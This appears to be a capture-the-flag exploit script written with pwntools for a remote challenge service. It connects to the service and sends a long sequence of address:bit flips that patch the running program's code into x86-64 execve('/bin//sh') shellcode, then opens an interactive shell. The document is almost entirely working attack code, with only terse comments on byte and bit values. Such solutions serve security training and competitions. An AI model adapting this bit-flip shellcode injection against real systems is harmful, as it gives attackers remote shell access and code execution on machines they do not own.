#! /usr/bin/env python

from pwn import *

sc = '\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'
cr = '\xb8\x00\x00\x00\x00\x48\x8b\x75\xf8\x64\x48\x33\x34\x25\x28\x00\x00\x00\x74\x05\xeb\xbf\xfd\xff\xff'

#nc flatearth.fluxfingers.net 1744
s = remote('flatearth.fluxfingers.net', 1744)
#s = process('./bit')

s.sendline('400714:5')

start_p = 400718
end_p = 400730

# b8 1011 1000
# 48 0100 1000
s.sendline('400718:4')
s.sendline('400718:5')
s.sendline('400718:6')
s.sendline('400718:7')

# 00 0000 0000
# bb 1011 1011
s.sendline('400719:0')
s.sendline('400719:1')
s.sendline('400719:3')
s.sendline('400719:4')
s.sendline('400719:5')
s.sendline('400719:7')

# 00 0000 0000
# d1 1101 0001
s.sendline('40071A:0')
s.sendline('40071A:4')
s.sendline('40071A:6')
s.sendline('40071A:7')

# 00 0000 0000
# 9d 1001 1101
s.sendline('40071B:0')
s.sendline('40071B:2')
s.sendline('40071B:3')
s.sendline('40071B:4')
s.sendline('40071B:7')

# 00 0000 0000
# 96 1001 0110
s.sendline('40071C:1')
s.sendline('40071C:2')
s.sendline('40071C:4')
s.sendline('40071C:7')

# 48 0100 1000
# 91 1001 0001
s.sendline('40071D:0')
s.sendline('40071D:3')
s.sendline('40071D:4')
s.sendline('40071D:6')
s.sendline('40071D:7')

# 8b 1000 1011
# d0 1101 0000
s.sendline('40071E:0')
s.sendline('40071E:1')
s.sendline('40071E:3')
s.sendline('40071E:4')
s.sendline('40071E:6')

# 75 0111 0101
# 8c 1000 1100
s.sendline('40071F:0')
s.sendline('40071F:3')
s.sendline('40071F:4')
s.sendline('40071F:5')
s.sendline('40071F:6')
s.sendline('40071F:7')

# f8 1111 1000
# 97 1001 0111
s.sendline('400720:0')
s.sendline('400720:1')
s.sendline('400720:2')
s.sendline('400720:3')
s.sendline('400720:5')
s.sendline('400720:6')

# 64 0110 0100
# ff 1111 1111
s.sendline('400721:0')
s.sendline('400721:1')
s.sendline('400721:3')
s.sendline('400721:4')
s.sendline('400721:7')

s.sendline('400723:2')
s.sendline('400723:6')
s.sendline('400723:7')

s.sendline('400724:0')
s.sendline('400724:1')
s.sendline('400724:2')
s.sendline('400724:3')
s.sendline('400724:5')
s.sendline('400724:6')
s.sendline('400724:7')

s.sendline('400725:1')
s.sendline('400725:2')
s.sendline('400725:4')
s.sendline('400725:5')
s.sendline('400725:6')

s.sendline('400726:0')
s.sendline('400726:3')
s.sendline('400726:4')

s.sendline('400727:6')
s.sendline('400727:7')

s.sendline('400728:0')
s.sendline('400728:3')
s.sendline('400728:4')
s.sendline('400728:7')

s.sendline('400729:0')
s.sendline('400729:4')
s.sendline('400729:5')

s.sendline('40072A:1')
s.sendline('40072A:7')

s.sendline('40072B:0')
s.sendline('40072B:4')
s.sendline('40072B:6')

s.sendline('40072C:0')
s.sendline('40072C:1')
s.sendline('40072C:2')
s.sendline('40072C:4')
s.sendline('40072C:5')
s.sendline('40072C:7')

s.sendline('40072D:0')
s.sendline('40072D:1')
s.sendline('40072D:2')
s.sendline('40072D:3')

s.sendline('40072E:1')
s.sendline('40072E:2')
s.sendline('40072E:6')
s.sendline('40072E:7')

s.sendline('40072F:4')
s.sendline('40072F:5')
s.sendline('40072F:6')
s.sendline('40072F:7')

s.sendline('400730:1')
s.sendline('400730:3')
s.sendline('400730:4')
s.sendline('400730:5')
s.sendline('400730:6')
s.sendline('400730:7')

s.sendline('400714:5')

s.interactive()












































































